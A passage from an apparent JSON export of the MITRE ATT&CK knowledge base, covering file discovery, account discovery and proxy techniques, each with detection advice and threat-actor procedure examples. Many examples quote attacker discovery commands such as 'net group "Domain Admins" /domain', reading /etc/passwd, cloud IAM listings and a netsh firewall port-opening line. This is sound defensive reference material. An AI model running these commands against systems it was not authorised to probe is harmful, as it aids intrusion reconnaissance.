      "REvilhas the ability to identify specific files and directories that are not to be encrypted.[299][300][301][302][303][304]",
      "Rising Suncan enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time.Rising Suncan enumerate the compilation timestamp of Windows executable files.[305]",
      "ROADSWEEPcan enumerate files on infected devices and avoid encrypting files with .exe, .dll,    .sys, .lnk, or . lck extensions.[83][306][307]",
      "ROKRAThas the ability to gather a list of files and directories on the infected system.[308][309][310]",
      "Roverautomatically searches for files on local drives based on a predefined list of file extensions.[311]",
      "Royalcan identify specific files and directories to exclude from the encryption process.[312][313][314]",
      "RTMcan check for specific files and directories associated with virtualization and malware analysis.[315]",
      "Ryukhas enumerated files and folders on all mounted drives.[316]",
      "Saint Botcan search a compromised host for specific files.[259]",
      "Samuraican use a specific module for file enumeration.[242]",
      "Sandworm Teamhas enumerated files on a compromised host.[244][317]",
      "Scattered SpiderSpider enumerates a target organization for files and directories of interest, including source code.[318][319]",
      "SDBbothas the ability to get directory listings or drive information on a compromised host.[320]",
      "Seasalthas the capability to identify the drive type on a victim.[246]",
      "SharpDiscocan identify recently opened files by using an LNK format parser to extract the original file path from LNK files found in either%USERPROFILE%\\Recent(Windows XP) or%APPDATA%\\Microsoft\\Windows\\Recent(newer Windows versions) .[241]",
      "ShimRatcan list directories.[321]",
      "SHOTPUThas a command to obtain a directory listing.[322]",
      "SideTwisthas the ability to search for specific files.[323]",
      "Sidewinderhas used malware to collect information on files and directories.[324]",
      "SILENTTRINITYhas several modules, such asls.py,pwd.py, andrecentFiles.py, to enumerate directories and files.[325]",
      "Siloscapesearches for the Kubernetes config file and other related files using a regular expression.[326]",
      "Skidmaphas checked for the existence of specific files including/usr/sbin/setenforceand/etc/selinux/config. It also has the ability to monitor the cryptocurrency miner file and process.[327]",
      "Slivercan enumerate files on a target system.[328]",
      "SLOTHFULMEDIAcan enumerate files and directories.[329]",
      "Smoke Loaderrecursively searches through directories for files.[330]",
      "During theSolarWinds Compromise,APT29obtained information about the configured Exchange virtual directory usingGet-WebServicesVirtualDirectory.[331]",
      "SombRATcan executeenumto enumerate files in storage on a compromised system.[332]",
      "SoreFanghas the ability to list directories.[333]",
      "SOUNDBITEis capable of enumerating and manipulating files and directories.[334]",
      "Sowbugidentified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.[335]",
      "SPACESHIPidentifies files and directories for collection by searching for specific file extensions or file modification time.[41]",
      "Spicacan list filesystem contents on targeted systems.[336]",
      "StealBitcan be configured to exfiltrate specific file types.[205][337]",
      "StreamExhas the ability to enumerate drive types.[338]",
      "StrifeWatercan enumerate files on a compromised host.[339]",
      "StrongPitycan parse the hard drive on a compromised host to identify specific file extensions.[340]",
      "Stuxnetuses a driver to scan for specific filesystem driver objects.[341]",
      "SUGARDUMPcan search for and collect data from specific Chrome, Opera, Microsoft Edge, and Firefox files, including any folders that have the stringProfilein its name.[342]",
      "SUNBURSThad commands to enumerate files and directories.[343][344]",
      "SUNSPOTenumerated the Orion software Visual Studio solution directory path.[345]",
      "SynAckchecks its directory location in an attempt to avoid launching in a sandbox.[346][347]",
      "SysUpdatecan search files on a compromised host.[348][349]",
      "Taidoorcan search for specific files.[350]",
      "TAINTEDSCRIBEcan useDirectoryListto enumerate files in a specified directory.[351]",
      "TajMahalhas the ability to index files from drives, user profiles, and removable drives.[352]",
      "TeamTNThas used a script that checks/proc/*/environfor environment variables related to AWS.[353]",
      "ThreatNeedlecan obtain file and directory information.[354]",
      "TINYTYPHONsearches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.[30]",
      "ToddyCathas run scripts to enumerate recently modified documents having either a .pdf, .doc, .docx, .xls or .xlsx extension.[207]",
      "TrickBotsearches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.[355][356]",
      "Trojan.Karaganycan enumerate files and directories on a compromised host.[357]",
      "Troll Stealercan enumerate and collect items from local drives and folders.[358]",
      "Tropic Trooperhas monitored files' modified time.[359]",
      "TSCookiehas the ability to discover drive information on the infected host.[360]",
      "Turiancan search for specific files and list directories.[361]",
      "Turlasurveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent.[134][362]TurlaRPC backdoors have also searched for files matching thelPH*.dllpattern.[363]",
      "TYPEFRAMEcan search directories for files on the victim’s machine.[364]",
      "UPPERCUThas the capability to gather the victim's current directory.[365]",
      "Uroburoscan search for specific files on a compromised system.[366]",
      "USBferrycan detect the victim's file or folder list.[359]",
      "USBStealersearches victim drives for files matching certain extensions (\".skr\",\".pkr\" or \".key\") or names.[367][368]",
      "Velvet Anthas enumerated local files and folders on victim devices.[369]",
      "Volgmercan list directories on a victim.[370]",
      "Volt Typhoonhas enumerated directories containing vulnerability testing and cyber related content and facilities data such as construction drawings.[371]",
      "WannaCrysearches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files.[372][373]",
      "WarzoneRATcan enumerate directories on a compromise host.[374]",
      "WastedLockercan enumerate files and directories just prior to encryption.[375]",
      "WhisperGatecan locate files based on hardcoded file extensions.[376][377][378][379]",
      "Windigohas used a script to check for the presence of files created by OpenSSH backdoors.[380]",
      "WindTailhas the ability to enumerate the users home directory and the path to its own application bundle.[381][382]",
      "WINERACKcan enumerate files and directories.[95]",
      "WinMMsets a WH_CBT Windows hook to search for and capture files on the victim.[383]",
      "Winnti for Windowscan check for the presence of specific files prior to moving to the next phase of execution.[384]",
      "Winnti Grouphas used a program named ff.exe to search for specific documents on compromised hosts.[385]",
      "Winter Viverndelivered malicious JavaScript payloads capable of listing folders and emails in exploited email servers.[386]",
      "Woody RATcan list all files and their associated attributes, including filename, type, owner, creation time, last access time, last write time, size, and permissions.[387]",
      "XAgentOSXcontains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.[388]XAgentOSXcontains the showBackupIosFolder function to check for IOS device backups by runningls -la ~/Library/Application\\ Support/MobileSync/Backup/.[388]",
      "XCSSEThas usedmdfindto enumerate a list of apps known to grant screen sharing permissions and leverages a module to run the commandls -la ~/Desktop.[389][390]",
      "ytygathers information on victim’s drives and has a plugin for document listing.[391]",
      "Zebrocysearches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar.Zebrocyalso runs theecho %APPDATA%command to list the contents of the directory.[392][393][394]Zebrocycan obtain the current execution path as well as perform drive enumeration.[395][396]",
      "Zeus Pandasearches for specific directories on the victim’s machine.[397]",
      "ZIPLINEcan find and append specific files on Ivanti Connect Secure VPNs based upon received commands.[398]",
      "ZLibhas the ability to enumerate files and drives.[231]",
      "Zoxcan enumerate files on a compromised host.[399]",
      "zwShellcan browse the file system.[240]",
      "ZxShellhas a command to open a file manager and explorer on the system.[400]"
    ]
  },
  "T1087": {
    "Name": "Account Discovery",
    "Description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g.,Valid Accounts).Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.[1][2]On hosts, adversaries can use defaultPowerShelland other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",
    "Detects": [
      "Monitor logs and other sources of command execution history for actions that could be taken to gather information about accounts, including the use of calls to cloud APIs that perform account discovery.System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.",
      "Monitor access to file resources that contain local accounts and groups information such as/etc/passwd,/Usersdirectories, and the SAM database.If access requires high privileges, look for non-admin objects (such as users or processes) attempting to access restricted file resources.",
      "Monitor for processes that can be used to enumerate user accounts and groups such asnet.exeandnet1.exe, especially when executed in quick succession.[10]Information may also be acquired through Windows system management tools such asWindows Management InstrumentationandPowerShell."
    ],
    "Procedure Examples": [
      "Aquatic Pandaused thelastcommand in Linux environments to identify recently logged-in users on victim machines.[3]",
      "FIN13has enumerated all users and their roles from a victim's main treasury system.[4]",
      "ShimRatReporterlisted all non-privileged and privileged accounts available on the machine.[5]",
      "During theSolarWinds Compromise,APT29obtained a list of users and their roles from an Exchange server usingGet-ManagementRoleAssignment.[6]",
      "Woody RATcan identify administrator accounts on an infected machine.[7]",
      "XCSSETattempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data.[8]"
    ]
  },
  "T1087.001": {
    "Name": "Account Discovery:Local Account",
    "Description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.Commands such asnet userandnet localgroupof theNetutility andidandgroupson macOS and Linux can list local users and groups.[1][2][3]On Linux, local users can also be enumerated through the use of the/etc/passwdfile. On macOS, thedscl . list /Userscommand can be used to enumerate local accounts. On ESXi servers, theesxcli system account listcommand can list local user accounts.[4]",
    "Detects": [
      "Monitor for execution of commands and arguments associated with enumeration or information gathering of local accounts and groups such asnet user,net account,net localgroup,Get-LocalUser,dscl, andesxcli system accounts list.System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.",
      "Monitor access to file resources that contain local accounts and groups information such as/etc/passwd,/Usersdirectories, and the Windows SAM database.If access requires high privileges, look for non-admin objects (such as users or processes) attempting to access restricted file resources.",
      "Monitor for logging that may suggest a list of available groups and/or their associated settings has been extracted, ex. Windows EID 4798 and 4799.",
      "Monitor for API calls (such asNetUserEnum()) that may attempt to gather local accounts information such as type of user, privileges and groups.",
      "Monitor for processes that can be used to enumerate user accounts and groups such asnet.exeandnet1.exe, especially when executed in quick succession.[66]Information may also be acquired through Windows system management tools such asWindows Management InstrumentationandPowerShell.Note: Event IDs are for Sysmon (Event ID 1 - process creation) and Windows Security Log (Event ID 4688 - a new process has been created). - For Linux, auditing frameworks such as the Linux Auditing System (auditd) can be used to alert on the enumeration/reading of files that store local users, including/etc/passwd. - For MacOS, utilities that work in concert with Apple’s Endpoint Security Framework such as Process Monitor can be used to track usage of commands such asidandgroups.Analytic 1 - Net Discovery Commands(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"net.exe\" OR Image=\"net1.exe\""
    ],
    "Procedure Examples": [
      "admin@338actors used the following commands following exploitation of a machine withLOWBALLmalware to enumerate user accounts:net user >> %temp%\\downloadnet user /domain >> %temp%\\download[5]",
      "Agent Teslacan collect account information from the victim’s machine.[6]",
      "APT1used the commandsnet localgroup,net user, andnet groupto find accounts on the system.[1]",
      "APT3has used a tool that can obtain info about local and global group users, power users, and administrators.[7]",
      "APT32enumerated administrative users using the commandsnet localgroup administrators.[8]",
      "APT41used built-innetcommands to enumerate local administrator groups.[9]",
      "APT42has used the PowerShell-based POWERPOST script to collect local account names from the victim machine.[10]",
      "Bankshotgathers domain and account names/information through process monitoring.[11]",
      "Bazarcan identify administrator accounts on an infected host.[12]",
      "BitPaymercan enumerate the sessions for each user logged onto the infected host.[13]",
      "BloodHoundcan identify users with local administrator rights.[14]",
      "Chimerahas usednet userfor account discovery.[15]",
      "Comnieuses thenet usercommand.[16]",
      "The discovery modules used withDuqucan collect information on accounts and permissions.[17]",
      "DUSTTRAPcan enumerate local user accounts.[18]",
      "Eliseexecutesnet userafter initial communication is made to the remote server.[19]",
      "Empirecan acquire local and domain user account information.[20]",
      "Epicgathers a list of all user accounts, privilege classes, and time of last logon.[21]",
      "Fox Kittenhas accessed ntuser.dat and UserClass.dat on compromised hosts.[22]",
      "GeminiDukecollects information on local user accounts from the victim.[23]",
      "HyperStackcan enumerate all account names on a remote share.[24]",
      "InvisiMolehas a command to list account information on the victim’s machine.[25]",
      "Kazuargathers information on local groups and members on the victim’s machine.[26]",
      "Ke3changperforms account discovery using commands such asnet localgroup administratorsandnet group \"REDACTED\" /domainon specific permissions groups.[27]",
      "Kwampirscollects a list of accounts with the commandnet users.[28]",
      "Lotus Blossomhas used commands such asnetto profile local system users.[29]",
      "MgBotincludes modules for identifying local administrator accounts on victim systems.[30]",
      "Milanhas runC:\\Windows\\system32\\cmd.exe /c cmd /c dir c:\\users\\ /s 2>&1to discover local accounts.[31]",
      "Mis-Typemay create a file containing the results of the commandcmd.exe /c net user {Username}.[32]",
      "Moses Staffhas collected the administrator username from a compromised host.[33]",
      "MURKYTOPhas the capability to retrieve information about users on remote hosts.[34]",
      "Commands undernet usercan be used inNetto gather information about and manipulate user accounts.[35]",
      "OilRighas runnet user,net user /domain,net group \"domain admins\" /domain, andnet group \"Exchange Trusted Subsystem\" /domainto get account listings on a victim.[36]",
      "DuringOperation CuckooBees, the threat actors used thenet usercommand to gather account information.[37]",
      "OSInfoenumerates local and domain users[7]",
      "P.A.S. Webshellcan display the /etc/passwd file on a compromised host.[38]",
      "Pikabotwill retrieve the name of the user associated with the thread under which the malware is executing.[39]",
      "Ponyhas used theNetUserEnumfunction to enumerate local accounts.[40]",
      "Poseidon Groupsearches for administrator accounts on both the local victim machine and the network.[41]",
      "PoshC2can enumerate local and domain user account information.[42]",
      "PowerSploit'sGet-ProcessTokenGroupPrivesc-PowerUp module can enumerate all SIDs associated with its current token.[43][44]",
      "POWERSTATScan retrieve usernames from compromised hosts.[45]",
      "PUNCHBUGGYcan gather user names.[46]",
      "Pupyuses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.[47]",
      "Raccoon Stealerchecks the privileges of running processes to determine if the running user is equivalent toNT Authority\\System.[48]",
      "RATANKBAuses thenet usercommand.[49]",
      "RedCurlhas collected information about local accounts.[50][51]",
      "Remseccan obtain a list of users.[52]",
      "S-Typehas run the commandnet useron a victim.[32]",
      "SHOTPUThas a command to retrieve information about connected users.[53]",
      "SMOKEDHAMhas usednet.exe userandnet.exe usersto enumerate local accounts on a compromised host.[54]",
      "SoreFangcan collect usernames from the local system vianet.exe user.[55]",
      "Stuxnetenumerates user accounts of the local host.[56]",
      "Threat Group-3390has usednet userto conduct internal discovery of systems.[57]",
      "TrickBotcollects the users of the system.[58][59]",
      "Turlahas usednet userto enumerate local accounts on the system.[60][61]",
      "USBferrycan usenet userto gather information about local accounts.[62]",
      "Valakhas the ability to enumerate local admin accounts.[63]",
      "Volt Typhoonhas executednet userandquserto enumerate local account information.[64]"
    ]
  },
  "T1087.002": {
    "Name": "Account Discovery:Domain Account",
    "Description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.Commands such asnet user /domainandnet group /domainof theNetutility,dscacheutil -q groupon macOS, andldapsearchon Linux can list domain users and groups.PowerShellcmdlets includingGet-ADUserandGet-ADGroupMembermay enumerate members of Active Directory groups.[1]",
    "Detects": [
      "Monitor for execution of commands and arguments associated with enumeration or information gathering of domain accounts and groups, such asnet user /domainandnet group /domain,dscacheutil -q groupon macOS, andldapsearchon Linux.System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.",
      "Monitor for logging that may suggest a list of available groups and/or their associated settings has been extracted, ex. Windows EID 4798 and 4799.",
      "Monitor and analyze traffic patterns and packet inspection associated to LDAP and MSRPC that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure).",
      "Monitor for API calls that may attempt to gather information about domain accounts such as type of user, privileges and groups.",
      "Monitor for processes that can be used to enumerate domain accounts and groups, such asnet.exeandnet1.exe, especially when executed in quick succession.[72]Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell."
    ],
    "Procedure Examples": [
      "AdFindcan enumerate domain users.[2][3][4][5][6]",
      "APT41used built-innetcommands to enumerate domain administrator users.[7]",
      "Bankshotgathers domain and account names/information through process monitoring.[8]",
      "Bazarhas the ability to identify domain administrator accounts.[9][10]",
      "BlackBytehas used tools such asAdFindto identify and enumerate domain accounts.[11]",
      "BlackCatcan utilizenet usecommands to identify domain users.[12]",
      "BloodHoundcan collect information about domain users, including identification of domain admin accounts.[13]",
      "BoomBoxhas the ability to execute an LDAP query to enumerate the distinguished name, SAM account name, and display name for all domain users.[14]",
      "BRONZE BUTLERhas usednet user /domainto identify account information.[15]",
      "Brute Ratel C4can use LDAP queries,net group \"Domain Admins\" /domainandnet user /domainfor discovery.[16][17]",
      "Chimerahas has usednet user /domandnet user Administratorto enumerate domain accounts including administrator accounts.[18][19]",
      "Cobalt Strikecan determine if the user on an infected machine is in the admin or domain admin group.[20]",
      "CrackMapExeccan enumerate the domain user accounts on a targeted system.[21]",
      "Dragonflyhas used batch scripts to enumerate users on a victim domain controller.[22]",
      "dsquerycan be used to gather information on user accounts within a domain.[23][24]",
      "DUSTTRAPcan enumerate domain accounts.[25]",
      "Empirecan acquire local and domain user account information.[26][27]",
      "FIN13can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts:GetUserSPNs.vbsandquerySpn.vbs.[28][29]",
      "FIN6has used Metasploit’sPsExecNTDSGRAB module to obtain a copy of the victim's Active Directory database.[30]",
      "Fox Kittenhas used the Softerra LDAP browser to browse documentation on service accounts.[31]",
      "TheIceAppleActive Directory Querier module  can perform authenticated requests against an Active Directory server.[32]",
      "IcedIDcan query LDAP and can use built-innetcommands to identify additional users on the network to infect.[33][34]",
      "INC Ransomhas scanned for domain admin accounts in compromised environments.[35]",
      "Ke3changperforms account discovery using commands such asnet localgroup administratorsandnet group \"REDACTED\" /domainon specific permissions groups.[36]",
      "LAPSUS$has used the AD Explorer tool to enumerate users on a victim's network.[37][38]",
      "Latrodectuscan runC:\\Windows\\System32\\cmd.exe /c net group \"Domain Admins\" /domainto identify domain administrator accounts.[39]",
      "Lotus Blossomhas usednetcommands and tools such asAdFindto profile domain accounts associated with victim machines and make Active Directory queries.[40][41]",
      "menuPasshas used the Microsoft administration tool csvde.exe to export Active Directory data.[42]",
      "MgBotincludes modules for collecting information on Active Directory domain accounts.[43]",
      "MuddyWaterhas usedcmd.exe net user /domainto enumerate domain users.[44]",
      "Netcommands used with the/domainflag can be used to gather information about and manipulate user accounts on the current domain.[45]",
      "OilRighas runnet user,net user /domain,net group \"domain admins\" /domain, andnet group \"Exchange Trusted Subsystem\" /domainto get account listings on a victim.[46]",
      "DuringOperation CuckooBees, the threat actors used thedsqueryanddsgetcommands to get domain environment information and to query users in administrative groups.[47]",
      "DuringOperation Dream Job,Lazarus Groupqueried compromised victim's active directory servers to obtain the list of employees including administrator accounts.[48]",
      "DuringOperation Wocao, threat actors used thenetcommand to retrieve information about domain accounts.[49]",
      "OSInfoenumerates local and domain users[50]",
      "Poseidon Groupsearches for administrator accounts on both the local victim machine and the network.[51]",
      "PoshC2can enumerate local and domain user account information.[52]",
      "POWRUNERmay collect user account information by runningnet user /domainor a series of other commands on a victim.[53]",
      "RedCurlhas collected information about domain accounts using SysInternal’s AdExplorer functionality   .[54][55]",
      "Sandworm Teamhas used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD.[56]",
      "Scattered Spiderleverages legitimate domain accounts to gain access to the target environment.[57][58]",
      "SILENTTRINITYcan useSystem.Security.AccessControlnamespaces to retrieve domain user information.[59]",
      "During theSolarWinds Compromise,APT29used PowerShell to discover domain accounts by exectuingGet-ADUserandGet-ADGroupMember.[1][60]",
      "SoreFangcan enumerate domain accounts vianet.exe user /domain.[61]",
      "Storm-1811has performed domain account enumeration during intrusions.[62]",
      "Stuxnetenumerates user accounts of the domain.[63]",
      "Sykipotmay usenet group \"domain admins\" /domainto display accounts in the \"domain admins\" permissions group andnet localgroup \"administrators\"to list local system administrator group membership.[64]",
      "ToddyCathas runnet user %USER% /domfor account discovery.[65]",
      "Turlahas usednet user /domainto enumerate domain accounts.[66]",
      "Valakhas the ability to enumerate domain admin accounts.[67]",
      "Volt Typhoonhas runnet group /domandnet group \"Domain Admins\" /domin compromised environments for account discovery.[68][69]",
      "Wizard Spiderhas identified domain admins through the use ofnet group \"Domain admins\" /DOMAIN.Wizard Spiderhas also leveraged the PowerShell cmdletGet-ADComputerto collect account names from Active Directory data.[10][70]"
    ]
  },
  "T1087.003": {
    "Name": "Account Discovery:Email Account",
    "Description": "Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).[1]In on-premises Exchange and Exchange Online, theGet-GlobalAddressListPowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.[2][3]In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.[4]",
    "Detects": [
      "Monitor for execution of commands and arguments associated with enumeration or information gathering of email addresses and accounts such asGet-AddressList,Get-GlobalAddressList, andGet-OfflineAddressBook.",
      "Monitor for newly executed processes, such asWindows Management InstrumentationandPowerShell, with arguments that can be used to enumerate email addresses and accounts."
    ],
    "Procedure Examples": [
      "Backdoor.Oldreacollects address book information from Outlook.[5]",
      "BoomBoxcan execute an LDAP query to discover e-mail accounts for domain users.[6]",
      "DuringC0027,Scattered Spideraccessed Azure AD to identify email addresses.[7]",
      "Emotethas been observed leveraging a module that can scrape email addresses from Outlook.[8][9][10]",
      "Grandoreirocan parse Outlook .pst files to extract e-mail addresses.[11]",
      "DuringHomeLand Justice, threat actors used compromised Exchange accounts to search mailboxes for administrator accounts.[12]",
      "Lizarcan collect email accounts from Microsoft Outlook and Mozilla Thunderbird.[13]",
      "Magic Houndhas used Powershell to discover email accounts.[14]",
      "MailSnipercan be used to obtain account names from Exchange and Office 365 using theGet-GlobalAddressListcmdlet.[3]",
      "RedCurlhas collected information about email accounts.[15][16]",
      "Rulercan be used to enumerate Exchange users and dump the GAL.[17]",
      "Sandworm Teamused malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application.[18]",
      "TA505has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.[19]",
      "TrickBotcollects email addresses from Outlook.[20]"
    ]
  },
  "T1087.004": {
    "Name": "Account Discovery:Cloud Account",
    "Description": "Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.With authenticated access there are several tools that can be used to find accounts. TheGet-MsolRoleMemberPowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.[1][2]The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The commandaz ad user listwill list all users within a domain.[3][4]The AWS commandaws iam list-usersmay be used to obtain a list of users in the current account whileaws iam list-rolescan obtain IAM roles that have a specified path prefix.[5][6]In GCP,gcloud iam service-accounts listandgcloud projects get-iam-policymay be used to obtain a listing of service accounts and users in a project.[7]",
    "Detects": [
      "Monitor logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained."
    ],
    "Procedure Examples": [
      "AADInternalscan enumerate Azure AD users.[8]",
      "APT29has conducted enumeration of Azure AD accounts.[9]",
      "DuringC0027,Scattered Spideraccessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes.[10]",
      "Pacucan enumerate IAM users, roles, and groups.[11]",
      "ROADToolscan enumerate Azure AD users.[12]"
    ]
  },
  "T1090": {
    "Name": "Proxy",
    "Description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, includingHTRAN, ZXProxy, and ZXPortMap.[1]Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT41used a tool called CLASSFON to covertly proxy network communications.[2]",
      "Aria-bodyhas the ability to use a reverse SOCKS proxy module.[3]",
      "AuditCredcan utilize proxy for communications.[4]",
      "BADCALLfunctions as a proxy server between the victim and C2 server.[5]",
      "BADHATCHcan use SOCKS4 and SOCKS5 proxies to connect to actor-controlled C2 servers.BADHATCHcan also emulate a reverse proxy on a compromised machine to connect with actor-controlled C2 servers.[6]",
      "Bisonalhas supported use of a proxy server.[7]",
      "Blue Mockingbirdhas usedFRP, ssf, and Venom to establish SOCKS proxy connections.[8]",
      "DuringC0017,APT41used the Cloudflare CDN to proxy C2 traffic.[9]",
      "DuringC0027,Scattered Spiderinstalled the open-source rsocx reverse proxy tool on a targeted ESXi appliance.[10]",
      "Cardinal RATcan act as a reverse proxy.[11]",
      "Cinnamon Tempesthas used a customized version of the Iox port-forwarding and proxy tool.[12]",
      "CopyKittenshas used the AirVPN service for operational activity.[13]",
      "Dridexcontains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers.[14][15]",
      "Earth Luscaadopted Cloudflare as a proxy for compromised servers.[16]",
      "Fox Kittenhas used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.[17][18][19]",
      "FRPcan proxy communications through a server in public IP space to local servers located behind a NAT or firewall.[20]",
      "FunnyDreamcan identify and use configured proxies in a compromised network for C2 communication.[21]",
      "GoBearimplements SOCKS5 proxy functionality.[22]",
      "Green Lambertcan use proxies for C2 traffic.[23][24]",
      "HARDRAINuses the commandcmd.exe /c netsh firewall add portopening TCP 443 \"adp\"and makes the victim machine function as a proxy server.[25]",
      "HOPLIGHThas multiple proxy options that mask traffic between the malware and the remote operators.[26]",
      "HTRANcan proxy TCP socket connections to obfuscate command and control infrastructure.[27][28]",
      "jRATcan serve as a SOCKS proxy server.[29]",
      "Kapekacan identify system proxy settings viaWinHttpGetIEProxyConfigForCurrentUser()during initialization and utilize these settings for subsequent command and control operations.[30]",
      "Kesselcan use a proxy during exfiltration if set in the configuration.[31]",
      "KEYPLUGhas used Cloudflare CDN associated infrastructure to redirect C2 communications to malicious domains.[9]",
      "KOCTOPUShas deployed a modified version of Invoke-Ngrok to expose open local ports to the Internet.[32]",
      "LAPSUS$has leverage NordVPN for its egress points when targeting intended victims.[33]",
      "LITTLELAMB.WOOLTEAhas the ability to function as a SOCKS proxy.[34]",
      "LunarWebhas the ability to use a HTTP proxy server for C&C communications.[35]",
      "Magic Houndhas used Fast Reverse Proxy (FRP) for RDP traffic.[36]",
      "MoustachedBouncerhas used a reverse proxy tool similar to the GitHub repository revsocks.[37]",
      "Neo-reGeorghas the ability to establish a SOCKS5 proxy on a compromised web server.[38]",
      "netshcan be used to set up a proxy tunnel to allow remote host access to an infected host.[39]",
      "NETWIREcan implement use of proxies to pivot traffic.[40]",
      "ngrokcan be used to proxy connections to machines located behind NAT or firewalls.[41][42]",
      "DuringOperation MidnightEclipse, threat actors used the GO Simple Tunnel reverse proxy tool.[43]",
      "ForOperation Sharpshooter, the threat actors used the ExpressVPN service to hide their location.[44]",
      "DuringOperation Wocao, threat actors used a custom proxy tool called \"Agent\" which has support for multiple hops.[45]",
      "PLEADhas the ability to proxy network communications.[46]",
      "POLONIUMhas used the AirVPN service for operational activity.[13]",
      "PoshC2contains modules that allow for use of proxies in command and control.[47]",
      "QuasarRATcan communicate over a reverse proxy using SOCKS5.[48][49]",
      "RainyDaycan use proxy tools including boost_proxy_client for reverse proxy functionality.[50]",
      "RansomHubcan use a proxy to connect to remote SFTP servers.[51]",
      "Mustang Pandaproxied communication through the Cloudflare CDN service duringRedDelta Modified PlugX Infection Chain Operations.[52]",
      "reGeorgcan establish an HTTP or SOCKS proxy to tunnel data in and out of a network.[53][54][55]",
      "Remcosuses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.[56]",
      "Sagerunexuses several proxy configuration settings to ensure connectivity.[57]",
      "Samuraihas the ability to proxy connections to specified remote IPs and ports through a a proxy module.[58]",
      "Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally.[59]",
      "SDBbothas the ability to use port forwarding to establish a proxy between a target host and C2.[60]",
      "Socksbotcan start SOCKS proxy threads.[61]",
      "SombRAThas the ability to use an embedded SOCKS proxy in C2 communications.[62]",
      "TSCookiehas the ability to proxy communications with command and control (C2) servers.[63]",
      "TurlaRPC backdoors have included local UPnP RPC proxies.[64]",
